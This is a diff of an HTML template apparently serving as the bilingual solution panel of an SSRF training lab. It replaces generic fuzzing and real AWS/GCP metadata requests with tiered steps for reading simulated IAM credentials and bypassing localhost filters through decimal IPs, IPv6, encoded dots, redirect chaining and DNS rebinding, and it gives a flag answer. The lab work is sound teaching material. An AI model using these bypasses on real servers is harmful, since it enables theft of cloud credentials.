@@ -33,76 +33,78 @@
 
 <div id="resolution-data" class="hidden">
   <div class="lang-content" data-lang="es">
-    <h3>Pasos de explotación</h3>
+    <h3>Easy — Acceso directo a servicios internos</h3>
     <ol>
-      <li>El endpoint <code>/ssrf?url=...</code> realiza peticiones HTTP a cualquier URL sin validar ni filtrar.</li>
-      <li>Descubre endpoints internos con <strong>ffuf</strong> apuntando al parámetro vulnerable:</li>
+      <li>Accede al endpoint de metadatos cloud simulado:
+        <pre>http://localhost:5000/internal/cloud-metadata</pre></li>
+      <li>Enumera credenciales IAM simuladas de AWS:
+        <pre>http://localhost:5000/internal/cloud-metadata/iam/security-credentials/hacklabs-ec2-role</pre></li>
+      <li>Obtén las credenciales AWS simuladas (flag incluida en el JSON):
+        <pre>curl "http://localhost:5000/ssrf?url=http://localhost:5000/internal/cloud-metadata/iam/security-credentials/hacklabs-ec2-role"</pre></li>
+      <li>Flag: <code>HL{55rf_cl0ud_m3t4d4t4}</code> (dentro de la respuesta JSON)</li>
+      <li>Escanea puertos internos para detectar servicios:
+        <pre>http://localhost:22    # detecta SSH
+http://localhost:3306  # detecta MySQL</pre></li>
     </ol>
-    <pre><code class="language-bash"># Fuzzing de rutas internas vía SSRF
-ffuf -u "http://localhost:5000/ssrf?url=http://127.0.0.1:5000/FUZZ" \
-  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
-  -mc 200,301,302 -t 20
-
-# Escaneo de puertos internos vía SSRF (observa diferencias en tiempo/error)
-ffuf -u "http://localhost:5000/ssrf?url=http://127.0.0.1:FUZZ" \
-  -w /usr/share/seclists/Fuzzing/ports.txt \
-  -mc 200 -t 10</code></pre>
-    <ol start="3">
-      <li>Accede a recursos internos encontrados:</li>
+    <h3>Medium — Bypass de blacklist (localhost/127.0.0.1 bloqueados)</h3>
+    <ol>
+      <li>Usa la IP decimal equivalente a 127.0.0.1 (2130706433):
+        <pre>http://2130706433:5000/internal/cloud-metadata</pre></li>
+      <li>Usa 0.0.0.0 (no está en el blacklist):
+        <pre>http://0.0.0.0:5000/internal/cloud-metadata</pre></li>
+      <li>Usa la IP de loopback alternativa:
+        <pre>http://127.0.0.2:5000/internal/cloud-metadata</pre></li>
+      <li>Accede a los metadatos igual que en Easy usando cualquiera de estas IPs alternativas.</li>
     </ol>
-    <pre><code class="language-bash">curl "http://localhost:5000/ssrf?url=http://127.0.0.1:5000/api/users"
-curl "http://localhost:5000/ssrf?url=http://127.0.0.1:5000/admin"
-curl "http://localhost:5000/ssrf?url=http://127.0.0.1:5000/.git/config"</code></pre>
-    <ol start="4">
-      <li>En entornos cloud, accede al servicio de metadatos:</li>
-    </ol>
-    <pre><code class="language-bash"># AWS metadata
-curl "http://localhost:5000/ssrf?url=http://169.254.169.254/latest/meta-data/"
-curl "http://localhost:5000/ssrf?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
-
-# GCP metadata
-curl "http://localhost:5000/ssrf?url=http://metadata.google.internal/computeMetadata/v1/"</code></pre>
-    <ol start="5">
-      <li>Con Burp Suite: intercepta la petición GET → Repeater → modifica el parámetro <code>url</code> → observa la respuesta del servidor.</li>
+    <h3>Hard — Bypass de whitelist estricta</h3>
+    <ol>
+      <li>IPv6 loopback (si no está bloqueado):
+        <pre>http://[::1]:5000/internal/cloud-metadata</pre></li>
+      <li>URL encoding doble para evadir la validación de cadena:
+        <pre>http://127%2e0%2e0%2e1:5000/internal/cloud-metadata</pre></li>
+      <li>Encadena con el lab de Open Redirect: usa un endpoint del servidor que redirija al destino interno.</li>
+      <li>DNS rebinding: usa un servicio externo que resuelva a 127.0.0.1 (por ejemplo <code>7f000001.nip.io</code>):
+        <pre>http://7f000001.nip.io:5000/internal/cloud-metadata</pre></li>
     </ol>
     <h3>Herramientas</h3>
-    <div><span class="tools-badge">curl</span> <span class="tools-badge">ffuf</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">gobuster</span></div>
+    <div><span class="tools-badge">curl</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">ffuf</span></div>
   </div>
   <div class="lang-content" data-lang="en" style="display:none">
-    <h3>Exploitation Steps</h3>
+    <h3>Easy — Direct access to internal services</h3>
     <ol>
-      <li>The <code>/ssrf?url=...</code> endpoint makes HTTP requests to any URL without validation or filtering.</li>
-      <li>Discover internal endpoints with <strong>ffuf</strong> targeting the vulnerable parameter:</li>
+      <li>Access the simulated cloud metadata endpoint:
+        <pre>http://localhost:5000/internal/cloud-metadata</pre></li>
+      <li>Enumerate simulated AWS IAM credentials:
+        <pre>http://localhost:5000/internal/cloud-metadata/iam/security-credentials/hacklabs-ec2-role</pre></li>
+      <li>Retrieve the simulated AWS credentials (flag included in the JSON):
+        <pre>curl "http://localhost:5000/ssrf?url=http://localhost:5000/internal/cloud-metadata/iam/security-credentials/hacklabs-ec2-role"</pre></li>
+      <li>Flag: <code>HL{55rf_cl0ud_m3t4d4t4}</code> (inside the JSON response)</li>
+      <li>Scan internal ports to detect running services:
+        <pre>http://localhost:22    # detects SSH
+http://localhost:3306  # detects MySQL</pre></li>
     </ol>
-    <pre><code class="language-bash"># Fuzzing internal paths via SSRF
-ffuf -u "http://localhost:5000/ssrf?url=http://127.0.0.1:5000/FUZZ" \
-  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
-  -mc 200,301,302 -t 20
-
-# Internal port scan via SSRF (observe time/error differences)
-ffuf -u "http://localhost:5000/ssrf?url=http://127.0.0.1:FUZZ" \
-  -w /usr/share/seclists/Fuzzing/ports.txt \
-  -mc 200 -t 10</code></pre>
-    <ol start="3">
-      <li>Access discovered internal resources:</li>
+    <h3>Medium — Blacklist bypass (localhost/127.0.0.1 blocked)</h3>
+    <ol>
+      <li>Use the decimal equivalent of 127.0.0.1 (2130706433):
+        <pre>http://2130706433:5000/internal/cloud-metadata</pre></li>
+      <li>Use 0.0.0.0 (not in the blacklist):
+        <pre>http://0.0.0.0:5000/internal/cloud-metadata</pre></li>
+      <li>Use an alternative loopback IP:
+        <pre>http://127.0.0.2:5000/internal/cloud-metadata</pre></li>
+      <li>Access the metadata the same way as Easy using any of these alternative IPs.</li>
     </ol>
-    <pre><code class="language-bash">curl "http://localhost:5000/ssrf?url=http://127.0.0.1:5000/api/users"
-curl "http://localhost:5000/ssrf?url=http://127.0.0.1:5000/admin"
-curl "http://localhost:5000/ssrf?url=http://127.0.0.1:5000/.git/config"</code></pre>
-    <ol start="4">
-      <li>In cloud environments, access the metadata service:</li>
-    </ol>
-    <pre><code class="language-bash"># AWS metadata
-curl "http://localhost:5000/ssrf?url=http://169.254.169.254/latest/meta-data/"
-curl "http://localhost:5000/ssrf?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
-
-# GCP metadata
-curl "http://localhost:5000/ssrf?url=http://metadata.google.internal/computeMetadata/v1/"</code></pre>
-    <ol start="5">
-      <li>With Burp Suite: intercept the GET request → Repeater → modify the <code>url</code> parameter → observe the server response.</li>
+    <h3>Hard — Strict whitelist bypass</h3>
+    <ol>
+      <li>IPv6 loopback (if not blocked):
+        <pre>http://[::1]:5000/internal/cloud-metadata</pre></li>
+      <li>Double URL encoding to evade string-based validation:
+        <pre>http://127%2e0%2e0%2e1:5000/internal/cloud-metadata</pre></li>
+      <li>Chain with the Open Redirect lab: use a server endpoint that redirects to the internal target.</li>
+      <li>DNS rebinding: use an external service that resolves to 127.0.0.1 (e.g. <code>7f000001.nip.io</code>):
+        <pre>http://7f000001.nip.io:5000/internal/cloud-metadata</pre></li>
     </ol>
     <h3>Tools</h3>
-    <div><span class="tools-badge">curl</span> <span class="tools-badge">ffuf</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">gobuster</span></div>
+    <div><span class="tools-badge">curl</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">ffuf</span></div>
   </div>
 </div>
 {% endblock %}
